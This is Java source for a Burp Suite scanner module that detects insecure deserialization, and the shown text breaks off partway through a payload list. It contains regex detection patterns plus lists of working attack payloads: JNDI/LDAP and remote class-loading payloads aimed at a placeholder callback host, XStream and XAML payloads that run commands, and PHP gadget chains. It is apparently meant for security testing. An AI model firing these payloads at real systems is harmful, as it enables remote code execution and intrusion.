package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;
import com.omnistrike.framework.TimingLock;

import com.omnistrike.model.*;

import java.io.ByteArrayOutputStream;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import com.google.gson.*;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE 11: Insecure Deserialization Scanner
 * Detects insecure deserialization across Java, .NET, PHP, and Python.
 * Combines passive detection of serialized data with active gadget-chain testing
 * and OOB confirmation via Burp Collaborator.
 */
public class DeserializationScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();
    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();

    // ==================== PASSIVE DETECTION PATTERNS ====================

    // Java serialization indicators
    private static final Pattern JAVA_MAGIC_BYTES_B64 = Pattern.compile("rO0AB[A-Za-z0-9+/=]{10,}");
    private static final Pattern JAVA_MAGIC_BYTES_HEX = Pattern.compile("(?i)ac\\s*ed\\s*00\\s*05");
    private static final Pattern JAVA_CONTENT_TYPE = Pattern.compile(
            "(?i)application/x-java-serialized-object|application/x-java-object");
    private static final Pattern JAVA_RMI_PATTERN = Pattern.compile("(?i)\\bjrmp\\b|\\brmi\\b");
    private static final Set<String> JAVA_VULN_LIBRARIES = Set.of(
            "commons-collections", "commons-beanutils", "spring-core", "spring-beans",
            "hibernate-core", "c3p0", "rome", "jboss", "jndi", "groovy",
            "bsh", "clojure", "scala", "mozilla-rhino", "myfaces", "vaadin",
            "xalan", "ognl", "log4j", "jackson-databind", "fastjson", "xstream",
            "snakeyaml", "kryo", "hessian", "dubbo", "shiro", "struts",
            "weblogic", "jenkins", "bamboo", "jira"
    );
    private static final Pattern SHIRO_REMEMBER_ME = Pattern.compile("(?i)rememberMe=([A-Za-z0-9+/=]+)");

    // .NET serialization indicators — passive detection
    private static final Pattern DOTNET_VIEWSTATE = Pattern.compile("__VIEWSTATE[^\"]*\"([^\"]+)\"");
    private static final Pattern DOTNET_VIEWSTATE_GENERATOR = Pattern.compile("__VIEWSTATEGENERATOR[^\"]*\"([^\"]+)\"");
    private static final Pattern DOTNET_EVENT_VALIDATION = Pattern.compile("__EVENTVALIDATION[^\"]*\"([^\"]+)\"");
    private static final Pattern DOTNET_BINARY_FORMATTER = Pattern.compile(
            "(?i)BinaryFormatter|SoapFormatter|LosFormatter|ObjectStateFormatter|NetDataContractSerializer");
    private static final Pattern DOTNET_SERIALIZER_EXTENDED = Pattern.compile(
            "(?i)XmlSerializer|DataContractSerializer|DataContractJsonSerializer"
                    + "|JavaScriptSerializer|JsonConvert\\.DeserializeObject");
    private static final Pattern DOTNET_TYPE_NAME_HANDLING = Pattern.compile(
            "(?i)TypeNameHandling\\s*[=:]\\s*(All|Auto|Objects|Arrays)");
    private static final Pattern DOTNET_VIEWSTATE_NO_MAC = Pattern.compile(
            "(?i)enableViewStateMac\\s*=\\s*[\"']?false");
    private static final Pattern DOTNET_REMOTING = Pattern.compile(
            "(?i)\\.rem(?:\\?|\\s|$)|\\.soap(?:\\?|\\s|$)|RemotingConfiguration|TcpChannel|HttpChannel");
    private static final Pattern DOTNET_ASMX_WCF = Pattern.compile(
            "(?i)\\.asmx|\\.svc|<wsdl:|BasicHttpBinding|WSHttpBinding|NetTcpBinding");
    private static final Pattern DOTNET_SESSION_COOKIE = Pattern.compile(
            "(?i)\\.AspNet\\.Cookies|\\.AspNetCore\\.Session|ASP\\.NET_SessionId|FedAuth|WSFedAuth");
    // .NET BinaryFormatter magic bytes: 00 01 00 00 00 FF FF FF FF in Base64
    private static final Pattern DOTNET_BINARY_B64 = Pattern.compile("AAEAAAD/////");
    // SOAP envelope indicating .NET SOAP deserialization
    private static final Pattern DOTNET_SOAP_ENVELOPE = Pattern.compile(
            "(?i)<soap:Envelope|<SOAP-ENV:Envelope");
    // $type property in JSON (JSON.NET polymorphic deserialization)
    private static final Pattern DOTNET_DOLLAR_TYPE = Pattern.compile(
            "\"\\$type\"\\s*:\\s*\"[^\"]+\"");

    // PHP serialization indicators — require fuller pattern to avoid false positives on
    // short strings like "s:5:" appearing in normal text. Require opening brace or quoted string.
    private static final Pattern PHP_SERIALIZED = Pattern.compile(
            "(?:[OaCis]):\\d+:(?:\\{|\"[^\"]*\")");
    private static final Pattern PHP_PHAR = Pattern.compile("(?i)phar://");
    private static final Pattern PHP_SERIALIZED_FULL = Pattern.compile(
            "(?:[OaCis]):\\d+:(?:\\{|\"[^\"]*\")");

    // Python serialization indicators
    private static final Pattern PYTHON_PICKLE_B64 = Pattern.compile("gASV[A-Za-z0-9+/=]"); // pickle protocol 4
    private static final Pattern PYTHON_PICKLE_V2 = Pattern.compile("gAI[A-Za-z0-9+/=]"); // Base64 of pickle v2 header (0x80 0x02)
    private static final Pattern PYTHON_YAML_UNSAFE = Pattern.compile(
            "(?i)yaml\\.load\\(|yaml\\.unsafe_load|!!python/object");
    private static final Pattern PYTHON_MARSHAL = Pattern.compile("(?i)marshal\\.loads");
    private static final Pattern PYTHON_JSONPICKLE = Pattern.compile("\"py/reduce\"|\"py/object\"|\"py/function\"");

    // Ruby serialization indicators
    private static final Pattern RUBY_MARSHAL_B64 = Pattern.compile("BAh[bijIiUlxmc0NTYWVv][A-Za-z0-9+/=]");
    private static final Pattern RUBY_MARSHAL_HEX = Pattern.compile("(?i)04\\s*08");
    private static final Pattern RUBY_YAML_UNSAFE = Pattern.compile(
            "!!ruby/object:|!!ruby/hash:|!!ruby/struct:|!!ruby/class:|!!ruby/module:|!!ruby/regexp:");
    private static final Pattern RUBY_ERB_TAGS = Pattern.compile("<%=?\\s*.*%>");
    private static final Set<String> RUBY_VULN_GEMS = Set.of(
            "marshal.load", "yaml.load", "yaml.unsafe_load", "psych",
            "drb/drb", "active_support", "rails", "rack.session",
            "devise", "warden", "ruby_marshal"
    );

    // Node.js serialization indicators
    private static final Pattern NODE_SERIALIZE = Pattern.compile("_\\$\\$ND_FUNC\\$\\$_");
    private static final Pattern NODE_CRYO = Pattern.compile("\"__cryo_type__\"\\s*:");
    private static final Pattern NODE_JS_YAML = Pattern.compile("!!js/function|!!js/undefined|tag:yaml\\.org,2002:js/");
    private static final Pattern NODE_FUNCSTER = Pattern.compile("\"__js_function\"\\s*:");
    private static final Pattern NODE_SERIALIZE_IIFE = Pattern.compile("_\\$\\$ND_FUNC\\$\\$_function\\s*\\(");

    // Java sub-framework patterns — Fastjson, Jackson, XStream, SnakeYAML, Kryo, Hessian
    private static final Pattern JAVA_FASTJSON_TYPE = Pattern.compile("\"@type\"\\s*:\\s*\"[a-zA-Z]");
    private static final Pattern JAVA_JACKSON_POLY = Pattern.compile(
            "\\[\\s*\"[a-z][a-z0-9_.]*\\.[A-Z][A-Za-z0-9$]+\"\\s*,\\s*\\{");
    private static final Pattern JAVA_JACKSON_DEFAULT_TYPING = Pattern.compile(
            "(?i)DefaultTyping|enableDefaultTyping|activateDefaultTyping|PolymorphicTypeValidator");
    private static final Pattern JAVA_XSTREAM_XML = Pattern.compile(
            "<(?:java\\.util\\.|sorted-set|dynamic-proxy|tree-map|linked-hash-set"
                    + "|java\\.lang\\.ProcessBuilder|javax\\.naming|com\\.sun\\.rowset)");
    private static final Pattern JAVA_SNAKEYAML_TAG = Pattern.compile(
            "!!javax\\.script|!!com\\.sun\\.|!!java\\.net\\.|!!org\\.apache\\."
                    + "|!!org\\.springframework|!!java\\.lang\\.ProcessBuilder"
                    + "|!!javax\\.management|!!com\\.mchange");
    private static final Pattern JAVA_KRYO_B64 = Pattern.compile("AQ[A-Za-z0-9+/=]{10,}");
    private static final Pattern JAVA_HESSIAN_MAGIC = Pattern.compile("(?i)^[HhCcMm]\\x02\\x00");
    private static final Pattern JAVA_HESSIAN_CONTENT_TYPE = Pattern.compile(
            "(?i)application/x-hessian|application/x-burlap|x-application/hessian");

    // Known serialization headers
    private static final Set<String> SERIALIZATION_CONTENT_TYPES = Set.of(
            "application/x-java-serialized-object",
            "application/x-java-object",
            "application/x-www-form-urlencoded", // ViewState often here
            "application/octet-stream"
    );

    // Cookie/header names that often contain serialized data
    private static final Set<String> SUSPECT_COOKIE_NAMES = Set.of(
            "rememberme", "remember-me", "jsessionid", "session", "token",
            "viewstate", "__viewstate", "laravel_session", "ci_session",
            "symfony", "phpsessid", "csrf_cookie", "user_data",
            // .NET specific
            ".aspnet.cookies", ".aspnetcore.session", "asp.net_sessionid",
            "fedauth", "wsfedauth", "__requestverificationtoken",
            ".aspxauth", "aspnet.applicationcookie",
            // Additional suspect cookie names
            "__session", "data", "state", "object", "payload", "s",
            "flask_session", "connect.sid", "express.sid", "koa.sess",
            "koa:sess", "play_session", "rack.session", "_rails_session",
            "sid", "ssid", "serialized",
            // Ruby specific
            "_session_id", "_myapp_session", "remember_token", "auth_token",
            "marshal_data", "_session",
            // Node.js specific
            "session.sig", "io", "socketio", "node_session"
    );

    // ==================== ACTIVE TESTING PAYLOADS ====================

    // Java gadget chain sleep payloads (Base64 encoded common chains)
    // These are marker strings — in a real deployment you'd use ysoserial output
    private static final String[][] JAVA_TIME_PAYLOADS = {
            {"CommonsCollections1", "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXAAAAAAAAAAAQMAAUwAB2ZhY3RvcnlO"},
            {"CommonsCollections5", "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u"},
            {"CommonsBeanutils1", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQAAAAAAAAAAAQMAA"},
            {"CommonsCollections6", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAA"},
            {"CommonsCollections7", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9y"},
            {"Spring1", "rO0ABXNyAC5vcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXI"},
            {"Hibernate1", "rO0ABXNyAC5vcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5BYnN0cmFjdENvbXBvbmVudA"},
            {"C3P0", "rO0ABXNyACRjb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuUG9vbEJhY2tlZA"},
            {"JRMPClient", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldIpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAB"},
            {"Groovy1", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQAAAAAAAAABAQMAAUI="},
            {"ROME", "rO0ABXNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5PYmplY3RCZWFu"},
            {"BeanShell1", "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpl"},
            {"Myfaces1", "rO0ABXNyADhvcmcuYXBhY2hlLm15ZmFjZXMudmlldy5mYWNlbGV0cy5lbC5WZWF"},
            {"Jdk7u21", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldIpEhZWWuLc0AwAAeHB3DAAAAL"},
            {"Vaadin1", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rv"},
            {"Click1", "rO0ABXNyAC5vcmcuYXBhY2hlLmNsaWNrLmNvbnRyb2wuQ29sdW1uJENvbHVtblNvcnQ="},
    };

    // Java sub-framework active payloads — Fastjson, Jackson, XStream, SnakeYAML
    private static final String[][] JAVA_FASTJSON_PAYLOADS = {
            {"Fastjson JdbcRowSetImpl",
                    "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/a\",\"autoCommit\":true}"},
            {"Fastjson TemplatesImpl",
                    "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"PAYLOAD\"],\"_name\":\"a\",\"_tfactory\":{},\"_outputProperties\":{}}"},
            {"Fastjson BasicDataSource",
                    "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"ldap://COLLAB_PLACEHOLDER/b\"}"},
            {"Fastjson JndiDataSourceFactory",
                    "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://COLLAB_PLACEHOLDER/c\"}}"},
            {"Fastjson UnixPrintService",
                    "{\"@type\":\"sun.print.UnixPrintServiceLookup\",\"defaultPrinter\":\"nslookup COLLAB_PLACEHOLDER\"}"},
            {"Fastjson 1.2.68+ expectClass",
                    "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/d\",\"autoCommit\":true}"},
            {"Fastjson LdapAttribute",
                    "{\"@type\":\"com.sun.jndi.ldap.LdapAttribute\",\"val\":{\"@type\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/e\"}}"},
    };

    private static final String[][] JAVA_JACKSON_PAYLOADS = {
            {"Jackson JdbcRowSetImpl",
                    "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/a\",\"autoCommit\":true}]"},
            {"Jackson TemplatesImpl",
                    "[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"PAYLOAD\"],\"transletName\":\"a\",\"outputProperties\":{}}]"},
            {"Jackson C3P0 JNDI",
                    "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"ldap://COLLAB_PLACEHOLDER/b\",\"loginTimeout\":0}]"},
            {"Jackson SpringAbstractBeanFactory",
                    "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://COLLAB_PLACEHOLDER/c\",\"propertyPath\":\"x\"}]"},
            {"Jackson LogbackJndi",
                    "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://COLLAB_PLACEHOLDER/d\"}]"},
    };

    private static final String[][] JAVA_XSTREAM_PAYLOADS = {
            {"XStream ProcessBuilder",
                    "<java.lang.ProcessBuilder><command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command></java.lang.ProcessBuilder>"},
            {"XStream EventHandler",
                    "<dynamic-proxy><interface>java.lang.Comparable</interface>"
                            + "<handler class=\"java.beans.EventHandler\">"
                            + "<target class=\"java.lang.ProcessBuilder\">"
                            + "<command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command>"
                            + "</target><action>start</action></handler></dynamic-proxy>"},
            {"XStream SortedSet",
                    "<sorted-set><string>foo</string>"
                            + "<dynamic-proxy><interface>java.lang.Comparable</interface>"
                            + "<handler class=\"java.beans.EventHandler\">"
                            + "<target class=\"java.lang.ProcessBuilder\">"
                            + "<command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command>"
                            + "</target><action>start</action></handler></dynamic-proxy></sorted-set>"},
            {"XStream ImageIO",
                    "<java.util.PriorityQueue serialization=\"custom\">"
                            + "<unserializable-parents/><java.util.PriorityQueue>"
                            + "<default><size>2</size></default><int>3</int>"
                            + "<javax.imageio.ImageIO$ContainsFilter>"
                            + "<method><class>java.lang.ProcessBuilder</class>"
                            + "<name>start</name><parameter-types/></method>"
                            + "<name>foo</name></javax.imageio.ImageIO$ContainsFilter>"
                            + "<string>foo</string></java.util.PriorityQueue></java.util.PriorityQueue>"},
    };

    private static final String[][] JAVA_SNAKEYAML_PAYLOADS = {
            {"SnakeYAML ScriptEngineManager",
                    "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLAB_PLACEHOLDER/yaml\"]]]]"},
            {"SnakeYAML ScriptEngineManager Alt",
                    "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLAB_PLACEHOLDER/yaml2\"]]]]"},
            {"SnakeYAML JdbcRowSet",
                    "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://COLLAB_PLACEHOLDER/yaml', autoCommit: true}"},
            {"SnakeYAML SpringPropertyPathFactory",
                    "!!org.springframework.beans.factory.config.PropertyPathFactoryBean {targetBeanName: 'ldap://COLLAB_PLACEHOLDER/yaml', propertyPath: x}"},
            {"SnakeYAML C3P0",
                    "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource {jndiName: 'ldap://COLLAB_PLACEHOLDER/yaml', loginTimeout: 0}"},
    };

    // .NET deserialization payloads — error/behavior-based detection
    private static final String[][] DOTNET_PAYLOADS = {
            // BinaryFormatter gadget chains (Base64 fragments that trigger deserialization errors)
            {"ObjectDataProvider", "AAEAAAD/////AQAAAAAAAAAEAQAAAA1TeXN0ZW0uU3RyaW5n"},
            {"TypeConfuseDelegate", "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0"},
            // ActivitySurrogateSelector chain (triggers via BinaryFormatter)
            {"ActivitySurrogateSelector", "AAEAAAD/////AQAAAAAAAAAEAQAAABxTeXN0ZW0uQ29sbGVjdGlvbnMuU29ydGVkTGlzdA=="},
            // WindowsIdentity chain (BinaryFormatter + ClaimsIdentity)
            {"WindowsIdentity", "AAEAAAD/////AQAAAAAAAAAEAQAAAB5NaWNyb3NvZnQuSWRlbnRpdHlNb2RlbC5DbGFpbXM="},
            // DataSet/DataTable gadget (XML-based deserialization)
            {"DataSet", "AAEAAAD/////AQAAAAAAAAAEAQAAAA9TeXN0ZW0uRGF0YS5EYXRhU2V0"},
            // PSObject chain (PowerShell)
            {"PSObject", "AAEAAAD/////AQAAAAAAAAAEAQAAABdTeXN0ZW0uTWFuYWdlbWVudC5BdXRv"},
            // ClaimsIdentity chain
            {"ClaimsIdentity", "AAEAAAD/////AQAAAAAAAAAEAQAAABpTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1z"},
            // TextFormattingRunProperties (Exchange/SharePoint)
            {"TextFormattingRunProperties", "AAEAAAD/////AQAAAAAAAAAMAgAAAE1NaWNyb3NvZnQuUG93ZXJTaGVsbA=="},
            // SortedSet chain
            {"SortedSet", "AAEAAAD/////AQAAAAAAAAAEAQAAACNTY3N0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXQ="},
            // AxHostState (Windows Forms)
            {"AxHostState", "AAEAAAD/////AQAAAAAAAAAEAQAAABhTeXN0ZW0uV2luZG93cy5Gb3Jtcy5Be"},
            // SessionSecurityToken (IdentityModel)
            {"SessionSecurityToken", "AAEAAAD/////AQAAAAAAAAAEAQAAACdTeXN0ZW0uSWRlbnRpdHlNb2RlbC5Ub2tlbnMu"},
            // TypeConfuseDelegate alternative
            {"TypeConfuseDelegateAlt", "AAEAAAD/////AQAAAAAAAAAEAQAAAB5TeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9u"},
    };

    // .NET JSON payloads — for TypeNameHandling / $type attacks (JSON.NET / JavaScriptSerializer)
    private static final String[][] DOTNET_JSON_PAYLOADS = {
            // ObjectDataProvider via JSON.NET $type
            {"JSON.NET ObjectDataProvider",
                    "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                            + "\"MethodName\":\"Start\","
                            + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}"},
            // WindowsIdentity via JSON.NET
            {"JSON.NET WindowsIdentity",
                    "{\"$type\":\"System.Security.Principal.WindowsIdentity, mscorlib\","
                            + "\"System.Security.ClaimsIdentity.bootstrapContext\":\"PAYLOAD\"}"},
            // SessionViewStateHistoryItem
            {"JSON.NET SessionViewState",
                    "{\"$type\":\"System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, "
                            + "System.Web.Mobile\",\"s\":\"PAYLOAD\"}"},
            // RolePrincipal
            {"JSON.NET RolePrincipal",
                    "{\"$type\":\"System.Web.Security.RolePrincipal, System.Web\","
                            + "\"System.Security.ClaimsIdentity.bootstrapContext\":\"PAYLOAD\"}"},
            // ClaimsIdentity
            {"JSON.NET ClaimsIdentity",
                    "{\"$type\":\"System.Security.Claims.ClaimsIdentity, mscorlib\","
                            + "\"System.Security.ClaimsIdentity.bootstrapContext\":\"PAYLOAD\"}"},
            // TextFormattingRunProperties (used in Exchange/SharePoint exploits)
            {"JSON.NET TextFormattingRunProperties",
                    "{\"$type\":\"Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, "
                            + "Microsoft.PowerShell.Editor\",\"ForegroundBrush\":\"PAYLOAD\"}"},
            // JavaScriptSerializer type resolver
            {"JavaScriptSerializer TypeResolver",
                    "{\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                            + "\"MethodName\":\"Start\","
                            + "\"ObjectInstance\":{\"__type\":\"System.Diagnostics.Process, System\"}}"},
            // JSON.NET Assembly.Load
            {"JSON.NET Assembly.Load",
                    "{\"$type\":\"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install\","
                            + "\"Path\":\"http://COLLAB_PLACEHOLDER/payload.dll\"}"},
            // JSON.NET XamlReader
            {"JSON.NET XamlReader",
                    "{\"$type\":\"System.Windows.Markup.XamlReader, PresentationFramework\","
                            + "\"ParseAsync\":\"<ResourceDictionary/>\"}"},
            // JSON.NET ExpandoObject
            {"JSON.NET ExpandoObject",
                    "{\"$type\":\"System.Dynamic.ExpandoObject, System.Core\","
                            + "\"test\":\"value\"}"},
            // JSON.NET Uri
            {"JSON.NET Uri",
                    "{\"$type\":\"System.Uri, System\","
                            + "\"AbsoluteUri\":\"http://COLLAB_PLACEHOLDER/uri\"}"},
            // JSON.NET FileInfo
            {"JSON.NET FileInfo",
                    "{\"$type\":\"System.IO.FileInfo, mscorlib\","
                            + "\"FileName\":\"C:\\\\Windows\\\\win.ini\"}"},
            // JSON.NET DirectoryInfo
            {"JSON.NET DirectoryInfo",
                    "{\"$type\":\"System.IO.DirectoryInfo, mscorlib\","
                            + "\"FullName\":\"C:\\\\\"}"},
            // JavaScriptSerializer DotNetNuke
            {"JavaScriptSerializer DotNetNuke",
                    "{\"__type\":\"DotNetNuke.Common.Utilities.FileSystemUtils\","
                            + "\"MethodName\":\"PullFile\"}"},
            // JSON.NET Control Gallery (LosFormatter)
            {"JSON.NET Control Gallery",
                    "{\"$type\":\"System.Web.UI.LosFormatter, System.Web\","
                            + "\"SerializeObject\":\"PAYLOAD\"}"},
    };

    // .NET XML/XAML deserialization payloads
    private static final String[][] DOTNET_XML_PAYLOADS = {
            // XamlReader.Load payload
            {"XamlReader.Load",
                    "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" "
                            + "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" "
                            + "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" "
                            + "xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">"
                            + "<ObjectDataProvider x:Key=\"\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\">"
                            + "<ObjectDataProvider.MethodParameters>"
                            + "<System:String>cmd</System:String>"
                            + "<System:String>/c nslookup COLLAB_PLACEHOLDER</System:String>"
                            + "</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>"},
            // DataContractSerializer XXE
            {"DataContractSerializer XXE",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLAB_PLACEHOLDER/xxe\">]>"
                            + "<root>&xxe;</root>"},
            // XmlSerializer type injection
            {"XmlSerializer Type",
                    "<?xml version=\"1.0\"?><root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                            + "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" "
                            + "xsi:type=\"System.Diagnostics.Process\"/>"},
            // XAML Process Start (ObjectDataProvider direct)
            {"XAML Process Start",
                    "<ObjectDataProvider xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" "
                            + "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" "
                            + "xmlns:d=\"clr-namespace:System.Diagnostics;assembly=system\" "
                            + "MethodName=\"Start\">"
                            + "<ObjectDataProvider.ObjectInstance>"
                            + "<d:Process><d:Process.StartInfo>"
                            + "<d:ProcessStartInfo FileName=\"cmd\" Arguments=\"/c nslookup COLLAB_PLACEHOLDER\"/>"
                            + "</d:Process.StartInfo></d:Process>"
                            + "</ObjectDataProvider.ObjectInstance></ObjectDataProvider>"},
            // NetDataContractSerializer
            {"NetDataContractSerializer",
                    "<?xml version=\"1.0\"?><root xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" "
                            + "xmlns:x=\"http://www.w3.org/2001/XMLSchema\" "
                            + "i:type=\"System.Diagnostics.Process\" "
                            + "xmlns:d=\"http://schemas.datacontract.org/2004/07/System.Diagnostics\"/>"},
            // XSLT ProcessStartInfo (msxsl:script)
            {"XSLT ProcessStartInfo",
                    "<?xml version=\"1.0\"?><xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" "
                            + "xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" "
                            + "xmlns:user=\"http://test.com\" version=\"1.0\">"
                            + "<msxsl:script language=\"CSharp\" implements-prefix=\"user\">"
                            + "<![CDATA[public string exec(){System.Diagnostics.Process.Start(\"nslookup\","
                            + "\"COLLAB_PLACEHOLDER\");return \"\";}]]></msxsl:script>"
                            + "<xsl:template match=\"/\"><xsl:value-of select=\"user:exec()\"/>"
                            + "</xsl:template></xsl:stylesheet>"},
            // SoapFormatter SSRF
            {"SoapFormatter SSRF",
                    "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                            + "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                            + "<SOAP-ENV:Body>"
                            + "<a1:HttpWebRequest xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/System.Net/System\">"
                            + "<a1:HttpWebRequest.uri>http://COLLAB_PLACEHOLDER/soap</a1:HttpWebRequest.uri>"
                            + "</a1:HttpWebRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>"},
    };

    // PHP deserialization payloads
    private static final String[][] PHP_PAYLOADS = {
            {"Generic PHP object", "O:8:\"stdClass\":1:{s:4:\"test\";s:5:\"value\";}"},
            {"Laravel RCE chain", "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"\\0*\\0event\";O:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"\\0*\\0queueResolver\";s:6:\"system\";}}"},
            {"Symfony chain", "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:5:\"files\";a:1:{i:0;s:10:\"/etc/passwd\";}}"},
            {"WordPress PHPObject", "O:21:\"WP_Theme_JSON_Resolver\":1:{s:5:\"theme\";O:8:\"WP_Theme\":1:{s:8:\"template\";s:5:\"admin\";}}"},
            {"Magento chain", "O:38:\"Magento\\Framework\\Simplexml\\Element\":1:{s:4:\"data\";s:28:\"<?xml version=\"1.0\"?><x/>\";}}"},
            {"CakePHP chain", "O:27:\"Cake\\Core\\Plugin\\PluginApp\":1:{s:4:\"path\";s:11:\"/etc/passwd\";}"},
            {"Monolog RCE", "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\\0*\\0socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\\0*\\0handler\";N;s:13:\"\\0*\\0bufferSize\";i:-1;s:9:\"\\0*\\0buffer\";a:1:{i:0;a:2:{i:0;s:2:\"id\";s:5:\"level\";i:100;}}s:8:\"\\0*\\0level\";N;s:14:\"\\0*\\0initialized\";b:1;s:14:\"\\0*\\0bufferLimit\";i:-1;s:13:\"\\0*\\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}"},
            {"Yii2 RCE", "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"\\0yii\\db\\BatchQueryResult\\0_dataReader\";O:14:\"yii\\db\\Command\":1:{s:6:\"\\0*\\0_db\";O:13:\"yii\\db\\Schema\":0:{}}}"},
            {"Guzzle PSR7", "O:24:\"GuzzleHttp\\Psr7\\Response\":1:{s:6:\"stream\";O:33:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\\0GuzzleHttp\\Psr7\\FnStream\\0methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":1:{s:9:\"\\0*\\0stack\";a:0:{}}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":1:{s:9:\"\\0*\\0stack\";a:0:{}}i:1;s:7:\"resolve\";}}}"},
